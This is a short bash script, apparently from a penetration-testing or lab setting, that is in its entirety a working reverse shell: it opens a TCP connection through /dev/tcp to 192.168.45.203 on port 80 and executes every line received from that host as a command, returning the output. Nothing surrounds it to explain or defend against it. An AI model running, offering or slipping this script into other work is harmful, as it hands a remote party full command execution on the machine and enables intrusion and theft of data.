#!/bin/bash

exec 5<>/dev/tcp/192.168.45.203/80
cat <&5 | while read line; do $line 2>&5 >&5; done
